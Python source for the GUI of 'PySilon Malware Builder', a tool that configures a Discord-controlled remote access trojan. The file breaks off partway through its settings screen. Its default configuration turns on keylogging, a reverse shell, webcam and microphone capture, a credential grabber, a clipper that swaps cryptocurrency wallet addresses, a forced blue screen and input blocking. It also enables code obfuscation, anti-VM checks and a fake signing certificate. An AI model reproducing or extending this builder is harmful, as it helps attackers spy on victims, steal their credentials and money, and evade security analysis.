import tkinter as tk
from tkinter import ttk
from tkinter import filedialog
import random
import os
import pyperclip
import time
import sys
import ctypes
import json
import tkinter.font as tkFont
from PIL import Image, ImageTk, ImageFont, ImageGrab
import requests

with open('resources/assets/builder_configuration.json', 'r', encoding='utf-8') as load_configuration:
    builder_configuration = json.loads(''.join(load_configuration.readlines()).replace('\n', ''))

class Builder:
    global builder_configuration
    def __init__(self, master):
        self.master = master
        self.master.title('PySilon Malware Builder')
        self.master.iconbitmap('resources/icons/default_icon.ico')

        myappid = 'mycompany.myproduct.subproduct.version'
        ctypes.windll.shell32.SetCurrentProcessExplicitAppUserModelID(myappid)

        try: self.malware_latest_version = json.loads(requests.get('https://raw.githubusercontent.com/mategol/PySilon-malware/v4-dev/resources/assets/builder_configuration.json').text.replace('\n', ''))['malware_version']
        except: self.malware_latest_version = None

        self.create_header()
        self.create_navigation()
        #builder_configuration['window_sizes'][builder_configuration['use_sizes']]
        self.canvas = tk.Canvas(self.master, border=0, highlightthickness=0)
        self.canvas.place(
            x=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['canvas']['geometry']['pos_x'],
            y=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['canvas']['geometry']['pos_y'],
            width=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['canvas']['geometry']['width'],
            height=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['canvas']['geometry']['height'])
        self.current_window = 0

        self.malware_configuration = {
            'token': '',
            'guild_ids': '',
            'registry_name': '',
            'directory_name': '',
            'executable_name': '',
            'implode_secret': '',
            'icon_path': 'resources/icons/default_icon.ico',
            'functionalities': {
                'keylogr': True,
                'scrnsht': True,
                'f_manag': True,
                'grabber': True,
                'mc_live': True,
                'mc_recc': True,
                'process': True,
                'rev_shl': True,
                'webcam_': True,
                'scrnrec': True,
                'inputbl': True,
                'bluesod': True,
                'crclipr': True,
                'messger': True,
                'txtspee': True,
                'audctrl': True,
                'monctrl': True,
                'webbloc': True,
                'jmpscar': True,
                'keystrk': True,
                'scrnman': True
            },
            'obfuscation': {
                'enabled': True,
                'settings': {
                    'logicTransformer': True,
                    'removeTypeHints': True,
                    'fstrToFormatSeq': True,
                    'encodeStrings': [
                        True, 
                        'chararray'  # mode (default: chararray) 
                    ],
                    'stringCollector': [
                        True, 
                        729,  # sample_size (default: 729)
                        512  # max_samples
                    ],
                    'floatsToComplex': False,
                    'intObfuscator': [
                        True, 
                        'bits'  # mode
                    ],
                    'renamer': [
                        True,
                        "f'{kind}{get_counter(kind)}'"  # rename_format (default: f'{kind}{get_counter(kind)})
                    ],
                    'typeAliasTransformer': [
                        True, 
                        ["str", "int", "float", "filter", "bool", "bytes", "map"]  # classes_to_alias
                    ],
                    'replaceAttribSet': True,
                    'varCollector': False, # only for Python 3.11
                    'unicodeTransformer': True
                }
            },
            'anti_vm': {
                'enabled': True,
                'FilesCheck': True,
                'ProcessesCheck': True,
                'HardwareIDsCheck': True,
                'MacAddressesCheck': True
            },
            'digital_certificate': {
                'enabled': True,
                'email_address': 'contact@pysilon.net',
                'producer_name': 'PySilon Malware',
                'country_name': 'NT',
                'locality_name': '',
                'state_or_province_name': '',
                'organization_name': '',
                'organization_unit_name': '',
                'serial_number': 0,
                'validity_start_in_seconds': 0,
                'validity_end_in_seconds': 60*60*24*365
            },
            'debug_mode': False,
            'crypto_clipper': {
                'BTC': '',
                'ETH': '',
                'DOGE': '',
                'LTC': '',
                'XMR': '',
                'BCH': '',
                'DASH': '',
                'TRX': '',
                'XRP': '',
                'XLM': ''
            }
        }

        if 'configuration.tmp' not in os.listdir('resources/assets'):
            with open('resources/assets/configuration.tmp', 'w', encoding='utf-8') as configuration_file:
                configuration_file.write(json.dumps(self.malware_configuration, indent=4))

        self.general_settings()

    def start_move(self, event):
        self.master.x = event.x
        self.master.y = event.y

    def stop_move(self, event):
        self.master.x = None
        self.master.y = None

    def do_move(self, event):
        dx = event.x - self.master.x
        dy = event.y - self.master.y
        x = self.master.winfo_x() + dx
        y = self.master.winfo_y() + dy
        self.master.geometry(f"+{x}+{y}")

    def get_file_path(self, file_types, initial_directory=os.getcwd()):
        root2 = tk.Tk()
        root2.withdraw()
        root2.attributes('-topmost', True)
        open_dir = filedialog.askopenfilename(filetypes=file_types, initialdir=initial_directory)
        root2.destroy()
        return open_dir

    def create_header(self):
        self.header = tk.Canvas(self.master, bd=0, highlightthickness=0, bg='#191919')
        self.header.place(
            x=0, 
            y=0, 
            width=700, 
            height=520)
        
        separator = tk.Frame(self.header, bg='#191919', height=1, width=700)
        self.header.create_window(
            0,
            19,
            window=separator, 
            anchor='nw')

        self.red_circle = tk.PhotoImage(file='resources/assets/builder_elements/red_circle.png')
        self.close_button = tk.Button(
            self.header,
            text='',
            image=self.red_circle,
            bd=0,
            cursor='hand2',
            relief=tk.FLAT,
            disabledforeground='white',
            command=self.exit_app
            )
        
        self.close_button.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['close']))
        self.close_button.bind("<Leave>", self.hide_tooltip)
        
        self.header.create_window(
            7,
            5,
            height=10,
            width=10,
            window=self.close_button, 
            anchor='nw')
        
        self.yellow_circle = tk.PhotoImage(file='resources/assets/builder_elements/yellow_circle.png')
        self.minimize_button = tk.Button(
            self.header,
            text='',
            image=self.yellow_circle,
            bd=0,
            cursor='hand2',
            relief=tk.FLAT,
            disabledforeground='white',
            command=self.minimize_app
            )
        
        self.minimize_button.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['minimize']))
        self.minimize_button.bind("<Leave>", self.hide_tooltip)
        
        self.header.create_window(
            22,
            5,
            height=10,
            width=10,
            window=self.minimize_button, 
            anchor='nw')
        
        self.blue_circle = tk.PhotoImage(file='resources/assets/builder_elements/blue_circle.png')
        self.config_load_button = tk.Button(
            self.header,
            text='',
            image=self.blue_circle,
            bd=0,
            cursor='hand2',
            relief=tk.FLAT,
            disabledforeground='white',
            command=lambda:self.load_configuration(self.get_file_path([('Configuration files', '.json')], '.'))
            )
        
        self.config_load_button.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['config_load']))
        self.config_load_button.bind("<Leave>", self.hide_tooltip)
        
        self.header.create_window(
            45,
            5,
            height=10,
            width=10,
            window=self.config_load_button, 
            anchor='nw')
        
        self.green_circle = tk.PhotoImage(file='resources/assets/builder_elements/green_circle.png')
        self.config_save_button = tk.Button(
            self.header,
            text='',
            image=self.green_circle,
            bd=0,
            cursor='hand2',
            relief=tk.FLAT,
            disabledforeground='white',
            command=lambda:self.save_configuration(False, from_window=self.current_window)
            )
        
        self.config_save_button.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['config_save']))
        self.config_save_button.bind("<Leave>", self.hide_tooltip)
        
        self.header.create_window(
            60,
            5,
            height=10,
            width=10,
            window=self.config_save_button, 
            anchor='nw')
        
        self.header.create_text(
            350,
            10,
            text='~ PySilon Malware Builder ~',
            fill='grey',
            font=(
                'Consolas', 
                11),
            anchor=tk.CENTER
        )
        
        self.header.bind("<ButtonPress-1>", self.start_move)
        self.header.bind("<ButtonRelease-1>", self.stop_move)
        self.header.bind("<B1-Motion>", self.do_move)

        self.apply_rounded_corners('top')

    def new_background(self, demand=None):
        self.canvas.delete('all')
        selected_background = random.randint(1, len(os.listdir('resources/assets/builder_backgrounds')))
        if demand != None: selected_background = demand
        self.image = ImageTk.PhotoImage(Image.open(f'resources/assets/builder_backgrounds/{selected_background}.jpg'))
        self.canvas.create_image(0, 0, image=self.image, anchor=tk.NW)

        self.apply_rounded_corners('bottom')
        
        self.tooltip_hint = self.canvas.create_text(
            10, 
            452, 
            text='Hover on elements to get more info.', 
            fill='white', 
            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['canvas']['tooltips']['font_size']), 
            anchor=tk.SW)

 
        if self.malware_latest_version == builder_configuration['malware_version']:
            version_indicator = [
                f'Up to date (v{builder_configuration["malware_version"]})', 
                'lime', 
                builder_configuration['window_sizes'][builder_configuration['use_sizes']]['canvas']['indicator']['latest_pos_x'], 
                0]
            
        elif self.malware_latest_version != None:
            version_indicator = [
                f'Outdated version (v{builder_configuration["malware_version"]}). Latest: v{self.malware_latest_version}', 
                'gold', 
                builder_configuration['window_sizes'][builder_configuration['use_sizes']]['canvas']['indicator']['nonlatest_pos_x'], 
                0]
            
            self.download_icon = tk.PhotoImage(file='resources/assets/builder_elements/download_icon.png')
            self.download = tk.Button(
                self.canvas,
                image=self.download_icon,
                disabledforeground='white',
                relief='flat',
                command=self.open_pysilon_github
                )
            self.canvas.create_window(builder_configuration['window_sizes'][builder_configuration['use_sizes']]['root_geometry']['width'], 0, window=self.download, anchor=tk.NE)
        else:
            version_indicator = [
                'Couldn\'t determine latest version.', 
                'red', 
                builder_configuration['window_sizes'][builder_configuration['use_sizes']]['canvas']['indicator']['latest_pos_x'], 
                0]

        self.canvas.create_text(
            version_indicator[2], 
            version_indicator[3], 
            text=version_indicator[0], 
            fill=version_indicator[1], 
            font=(
                'Consolas', 
                builder_configuration['window_sizes'][builder_configuration['use_sizes']]['canvas']['indicator']['font_size']), 
            anchor=tk.NE)
        
    def exit_app(self):
        for widgets in self.button_frame.winfo_children():
            widgets.destroy()
        self.button_frame.configure(background='#fe00ff')
        self.header.delete('all')
        self.header.configure(background='#fe00ff')
        self.canvas.delete('all')

        posx = self.master.winfo_x()
        posy = self.master.winfo_y()+60
        self.imgg = ImageGrab.grab(bbox=(posx, posy, posx+700, posy+460))

        self.imgg = ImageTk.PhotoImage(self.imgg)
        self.canvas.create_image(0, 0, image=self.imgg, anchor=tk.NW)

        self.kf = ImageTk.PhotoImage(Image.open('resources/assets/builder_elements/transparency/' + str(builder_configuration['use_sizes']) + '/1.png'))
        self.asd = self.canvas.create_image(0, 0, image=self.kf, anchor=tk.NW)
        self.master.update()

        for i in range(23):
            self.canvas.delete(self.asd)
            self.kf = ImageTk.PhotoImage(Image.open('resources/assets/builder_elements/transparency/' + str(builder_configuration['use_sizes']) + f'/{i+2}.png'))
            self.asd = self.canvas.create_image(0, 0, image=self.kf, anchor=tk.NW)
            self.master.update()

        time.sleep(1)

        sys.exit(0)

    def minimize_root_threw(self, a):
        self.master.unbind("<Map>")
        self.master.overrideredirect(True)
        size_y = 80
        size_x = 0

        for i in range(25):
            size_x += 28
            self.master.geometry(f'{size_x}x{size_y}')
            self.master.update()

        for i in range(22):
            size_y += 20
            self.master.geometry(f'{size_x}x{size_y}')
            self.master.update()

    def minimize_app(self):
        size_y = 520
        size_x = 700

        for i in range(23):
            size_y -= 20
            self.master.geometry(f'{size_x}x{size_y}')
            self.master.update()

        for i in range(25):
            size_x -= 28
            self.master.geometry(f'{size_x}x{size_y}')
            self.master.update()

        self.master.bind("<Map>", self.minimize_root_threw)
        self.master.state('withdrawn')
        self.master.overrideredirect(False)
        self.master.wm_state('iconic')

    def create_navigation(self):
        self.button_frame = tk.Frame(self.header)
        self.button_frame.place(
            x=0, 
            y=20, 
            width=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['root_geometry']['width'], 
            height=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['height'])

        self.general_settings_button = tk.Button(
            self.button_frame,
            text='General Settings',
            cursor='hand2',
            font=tkFont.Font(
                family='Consolas', 
                size=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['font_size']),
            disabledforeground='white',
            command=self.general_settings
            )
        self.general_settings_button.place(
            x=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['buttons'][0]['pos_x'], 
            y=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['buttons'][0]['pos_y'], 
            width=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['buttons'][0]['width'], 
            height=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['buttons'][0]['height'])

        self.functionality_settings_button = tk.Button(
            self.button_frame,
            text='Functionality Settings',
            cursor='hand2',
            font=tkFont.Font(
                family='Consolas', 
                size=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['font_size']),
            disabledforeground='white',
            command=self.functionality_settings
            )
        self.functionality_settings_button.place(
            x=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['buttons'][1]['pos_x'], 
            y=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['buttons'][1]['pos_y'], 
            width=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['buttons'][1]['width'], 
            height=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['buttons'][1]['height'])

        self.compiling_settings_button = tk.Button(
            self.button_frame,
            text='Compiling Settings',
            cursor='hand2',
            font=tkFont.Font(
                family='Consolas', 
                size=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['font_size']),
            disabledforeground='white',
            command=self.compiling_settings
            )
        self.compiling_settings_button.place(
            x=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['buttons'][2]['pos_x'], 
            y=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['buttons'][2]['pos_y'], 
            width=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['buttons'][2]['width'], 
            height=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['buttons'][2]['height'])

        self.banner_image = tk.PhotoImage(file='resources/assets/builder_elements/' + builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['banner']['path'])
        self.banner = tk.Button(
            self.button_frame,
            image=self.banner_image,
            disabledforeground='white',
            relief='flat',
            command=self.open_pysilon
            )
        self.banner.place(
            x=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['banner']['pos_x'], 
            y=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['banner']['pos_y'], 
            width=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['banner']['width'], 
            height=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['banner']['height'])
        
        horizontal_separator = ttk.Separator(self.button_frame, orient='horizontal')
        horizontal_separator.place(
            x=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['dividers'][0]['pos_x'], 
            y=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['dividers'][0]['pos_y'], 
            height=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['dividers'][0]['height'], 
            width=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['dividers'][0]['width'])
        
        vertical_separator = ttk.Separator(self.button_frame, orient='vertical')
        vertical_separator.place(
            x=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['dividers'][1]['pos_x'], 
            y=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['dividers'][1]['pos_y'], 
            height=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['dividers'][1]['height'], 
            width=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['navigation']['dividers'][1]['width'])
    
    def save_configuration(self, temporary=True, close=False, configuration=None, from_window=None):
        match from_window:
            case 1:
                self.malware_configuration['token'] = self.token_entry.get()
                self.malware_configuration['guild_ids'] = self.guildids_entry.get()
                self.malware_configuration['registry_name'] = self.registry_entry.get()
                self.malware_configuration['directory_name'] = self.directory_entry.get()
                self.malware_configuration['executable_name'] = self.executable_entry.get()
                self.malware_configuration['implode_secret'] = self.implode_entry.get()
            case 2:
                self.malware_configuration['functionalities'] = {
                    'keylogr': self.cbvar_keylogr.get(),
                    'scrnsht': self.cbvar_scrnsht.get(),
                    'f_manag': self.cbvar_fmanag.get(),
                    'grabber': self.cbvar_grabber.get(),
                    'mc_live': self.cbvar_mclive.get(),
                    'mc_recc': self.cbvar_mcrecc.get(),
                    'process': self.cbvar_process.get(),
                    'rev_shl': self.cbvar_revshl.get(),
                    'webcam_': self.cbvar_webcam.get(),
                    'scrnrec': self.cbvar_scrnrec.get(),
                    'inputbl': self.cbvar_inputbl.get(),
                    'bluesod': self.cbvar_bluesod.get(),
                    'crclipr': self.cbvar_crclipr.get(),
                    'messger': self.cbvar_messger.get(),
                    'txtspee': self.cbvar_txtspee.get(),
                    'audctrl': self.cbvar_audctrl.get(),
                    'monctrl': self.cbvar_monctrl.get(),
                    'webbloc': self.cbvar_webbloc.get(),
                    'jmpscar': self.cbvar_jmpscar.get(),
                    'keystrk': self.cbvar_keystrk.get(),
                    'scrnman': self.cbvar_scrnman.get()
                }
            case 3:
                self.malware_configuration['obfuscation']['enabled'] = self.cbvar_obfuscation.get()
                self.malware_configuration['anti_vm']['enabled'] = self.cbvar_antivm.get()
                self.malware_configuration['debug_mode'] = self.cbvar_debugmode.get()
                self.malware_configuration['digital_certificate']['enabled'] = self.cbvar_certificate.get()
                self.malware_configuration['digital_certificate']['producer_name'] = self.cert_producer_entry.get()
                self.malware_configuration['digital_certificate']['email_address'] = self.cert_mail_entry.get()
                self.malware_configuration['digital_certificate']['validity_end_in_seconds'] = self.cert_validity_entry.get()

        with open('configuration.json' if not temporary else 'resources/assets/configuration.tmp', 'w', encoding='utf-8') as configuration_file:
            configuration_file.write(json.dumps(self.malware_configuration, indent=4))

        if close != False:
            close.destroy()

    def apply_rounded_corners(self, position):
        if position == 'top':
            self.corners_image2 = ImageTk.PhotoImage(Image.open(f'resources/assets/builder_elements/corners2.png'))
            self.header.create_image(0, 0, image=self.corners_image2, anchor=tk.NW)
        elif position == 'bottom':
            self.corners_image = ImageTk.PhotoImage(Image.open(f'resources/assets/builder_elements/corners.png'))
            self.canvas.create_image(0, 440, image=self.corners_image, anchor=tk.NW)

    def load_configuration(self, path=False):
        with open('configuration.json' if path else 'resources/assets/configuration.tmp' if not path else path, 'r', encoding='utf-8') as configuration_file:
            self.malware_configuration = json.loads(''.join(configuration_file.readlines()))
    
    def write_configuration(self, temporary=True, close=False):
        with open('configuration.json' if not temporary else 'resources/assets/configuration.tmp', 'w', encoding='utf-8') as configuration_file:
            configuration_file.write(self.text.get('1.0', tk.END))
        self.malware_configuration = json.loads(self.text.get('1.0', tk.END))
        if close != False:
            close.destroy()

    def configuration_editor(self, file, highlight=['0.0', '1.0'], scroll='1.0'):
        cfg_editor = tk.Tk()
        cfg_editor.geometry(str(builder_configuration['window_sizes'][builder_configuration['use_sizes']]['config_editor']['geometry']['width']) + 'x' + str(builder_configuration['window_sizes'][builder_configuration['use_sizes']]['config_editor']['geometry']['height']))

        cfg_editor.title('Configuration Editor')
        cfg_editor.iconbitmap('resources/icons/default_icon.ico')

        frame = tk.Frame(cfg_editor)
        frame.place(
            x=0, 
            y=0, 
            width=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['config_editor']['geometry']['width'], 
            height=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['config_editor']['geometry']['height'])

        self.text = tk.Text(frame)
        self.text.place(
            x=0, 
            y=0, 
            width=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['config_editor']['text_area']['width'], 
            height=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['config_editor']['text_area']['height'])

        with open(file, 'r', encoding='utf-8') as configuration_file:
            self.text.insert('1.0', ''.join(configuration_file.readlines()))

        self.text.tag_add('highlight', highlight[0], highlight[1])
        self.text.tag_configure('highlight', background='#9effb8', foreground='black')
        self.text.see(scroll)

        btn_savecfg = tk.Button(
            frame,
            text='Save',
            font=tkFont.Font(
                family='Consolas', 
                size=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['config_editor']['save_button']['font_size']),
            disabledforeground='white',
            command=lambda:self.write_configuration(True, cfg_editor)
        )
        btn_savecfg.place(
            x=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['config_editor']['save_button']['pos_x'], 
            y=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['config_editor']['save_button']['pos_y'], 
            anchor=tk.SE)

        cfg_editor.tk_setPalette(background='#0A0A10', foreground='white', activeBackground='#0A0A10', activeForeground='white')
        cfg_editor.mainloop()

    def double_click_settings(self, context):
        if context == 'certificate': self.toggle_certificate()
        if time.time() - self.time_check < 0.5:
            if context == 'antivm':
                self.configuration_editor('resources/assets/configuration.tmp', ['75.0', '79.0'], '73.0')
            elif context == 'obfuscation':
                self.configuration_editor('resources/assets/configuration.tmp', ['34.0', '71.0'], '32.0')
            elif context == 'certificate':
                self.configuration_editor('resources/assets/configuration.tmp', ['82.0', '92.0'], '80.0')
        self.time_check = time.time()

    def open_pysilon(self):
        os.system('start https://pysilon.net')

    def open_pysilon_github(self):
        os.system('start https://github.com/mategol/PySilon-malware/releases')

    def show_tooltip(self, event, tooltip_text):
        self.canvas.delete(self.tooltip_hint)
        self.tooltip_label = tk.Label(self.canvas, text=tooltip_text, relief=tk.RIDGE, borderwidth=0, background="#0A0A10", wraplength=700)
        self.tooltip_label.place(
            x=10, 
            y=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['canvas']['tooltips']['pos_y'], 
            anchor=tk.SW)

    def hide_tooltip(self, event):
        self.tooltip_label.place_forget()
        self.tooltip_hint = self.canvas.create_text(
            10, 
            452, 
            text='Hover on elements to get more info.', 
            fill='white', 
            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['canvas']['tooltips']['font_size']), 
            anchor=tk.SW)

    def paste_token(self):
        self.token_entry.insert(0, pyperclip.paste())

    def change_icon(self):
        new_icon = self.get_file_path([('Icon files', '.jpg .png .ico')], 'resources/icons/default/Windows-10/popular')
        if new_icon == '': return
        Image.open(new_icon).resize((100, 100)).save('icon.png', format='PNG')
        self.icon_photo = tk.PhotoImage(file='icon.png')
        self.icon_button['image'] = self.icon_photo
        self.malware_configuration['icon_path'] = new_icon

    def toggle_certificate(self):
        if self.cbvar_certificate.get() == 1:
            self.cert_producer_entry['state'] = tk.NORMAL
            self.cert_mail_entry['state'] = tk.NORMAL
            self.cert_validity_entry['state'] = tk.NORMAL
        else:
            self.cert_producer_entry['state'] = tk.DISABLED
            self.cert_mail_entry['state'] = tk.DISABLED
            self.cert_validity_entry['state'] = tk.DISABLED

    def compile(self):
        self.save_configuration(True, from_window=3)
        print('compile')

    def general_settings(self):
        self.general_settings_button['state'] = tk.DISABLED
        self.general_settings_button['relief'] = 'flat'
        self.functionality_settings_button ['state'] = tk.NORMAL
        self.functionality_settings_button['relief'] = 'groove'
        self.compiling_settings_button['state'] = tk.NORMAL
        self.compiling_settings_button['relief'] = 'groove'
        
        if self.current_window > 0: self.save_configuration(True, from_window=self.current_window)
        self.current_window = 1
        self.new_background(1)
        self.load_configuration(False)

        # BOT Token
        self.canvas.create_text(
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['labels'][0]['pos_x'], 
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['labels'][0]['pos_y'], 
            text='BOT Token:', 
            fill='white', 
            font=(
                'Consolas', 
                builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['font_size']), 
            anchor=tk.E)
        
        self.token_entry = tk.Entry(
            self.canvas, 
            font=tkFont.Font(
                family='Consolas', 
                size=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['font_size']), 
            width=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['entries'][0]['width'])
        
        self.token_entry.insert(0, self.malware_configuration['token'])
        self.token_entry.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['token_entry']))
        self.token_entry.bind("<Leave>", self.hide_tooltip)

        self.canvas.create_window(
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['entries'][0]['pos_x'], 
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['entries'][0]['pos_y'], 
            window=self.token_entry, 
            anchor='w')
        
        self.paste_token_icon = tk.PhotoImage(file='resources/assets/builder_elements/paste_icon.png')

        self.paste_token_button = tk.Button(
            self.canvas,
            image=self.paste_token_icon,
            cursor='hand2',
            disabledforeground='white',
            relief='flat',
            width=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['token_paste_button']['width'],
            height=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['token_paste_button']['height'],
            command=self.paste_token
            )
        
        self.canvas.create_window(
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['token_paste_button']['pos_x'], 
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['token_paste_button']['pos_y'], 
            window=self.paste_token_button, 
            anchor='w')
 
        # Guild IDs
        self.canvas.create_text(
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['labels'][1]['pos_x'], 
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['labels'][1]['pos_y'], 
            text='Guild IDs:', 
            fill='white', 
            font=(
                'Consolas', 
                builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['font_size']), 
            anchor=tk.E)
        
        self.guildids_entry = tk.Entry(
            self.canvas, 
            font=tkFont.Font(
                family='Consolas', 
                size=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['font_size']), 
            width=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['entries'][1]['width'])
        
        self.guildids_entry.insert(0, self.malware_configuration['guild_ids'])
        self.guildids_entry.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['guildids_entry']))
        self.guildids_entry.bind("<Leave>", self.hide_tooltip)

        self.canvas.create_window(
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['entries'][1]['pos_x'], 
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['entries'][1]['pos_y'], 
            window=self.guildids_entry, 
            anchor='w')

        # Registry Name
        self.canvas.create_text(
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['labels'][2]['pos_x'], 
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['labels'][2]['pos_y'], 
            text='Registry Name:', 
            fill='white', 
            font=(
                'Consolas', 
                builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['font_size']), 
            anchor=tk.E)
        
        self.registry_entry = tk.Entry(
            self.canvas, 
            font=tkFont.Font(
                family='Consolas', 
                size=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['font_size']), 
            width=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['entries'][2]['width'])
        
        self.registry_entry.insert(0, self.malware_configuration['registry_name'])
        self.registry_entry.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['registry_entry']))
        self.registry_entry.bind("<Leave>", self.hide_tooltip)

        self.canvas.create_window(
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['entries'][2]['pos_x'], 
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['entries'][2]['pos_y'], 
            window=self.registry_entry, 
            anchor='w')

        # Directory Name
        self.canvas.create_text(
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['labels'][3]['pos_x'], 
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['labels'][3]['pos_y'], 
            text='Directory Name:', 
            fill='white', 
            font=(
                'Consolas', 
                builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['font_size']), 
            anchor=tk.E)
        
        self.directory_entry = tk.Entry(
            self.canvas, 
            font=tkFont.Font(
                family='Consolas', 
                size=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['font_size']), 
            width=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['entries'][3]['width'])
        
        self.directory_entry.insert(0, self.malware_configuration['directory_name'])
        self.directory_entry.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['directory_entry']))
        self.directory_entry.bind("<Leave>", self.hide_tooltip)

        self.canvas.create_window(
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['entries'][3]['pos_x'], 
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['entries'][3]['pos_y'],
            window=self.directory_entry, 
            anchor='w')

        # Executable Name
        self.canvas.create_text(
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['labels'][4]['pos_x'], 
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['labels'][4]['pos_y'],
            text='Executable Name:', 
            fill='white', 
            font=(
                'Consolas', 
                builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['font_size']), 
            anchor=tk.E)
        
        self.executable_entry = tk.Entry(
            self.canvas, 
            font=tkFont.Font(
                family='Consolas', 
                size=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['font_size']), 
            width=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['entries'][4]['width'])
        
        self.executable_entry.insert(0, self.malware_configuration['executable_name'])
        self.executable_entry.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['executable_entry']))
        self.executable_entry.bind("<Leave>", self.hide_tooltip)

        self.canvas.create_window(
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['entries'][4]['pos_x'], 
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['entries'][4]['pos_y'],
            window=self.executable_entry, 
            anchor='w')
        
        self.canvas.create_text(
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['labels'][4]['exe_pos_x'], 
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['labels'][4]['exe_pos_y'],
            text='.exe', 
            fill='white', 
            font=(
                'Consolas', 
                builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['font_size']),
            anchor=tk.W)

        # Implode Password
        self.canvas.create_text(
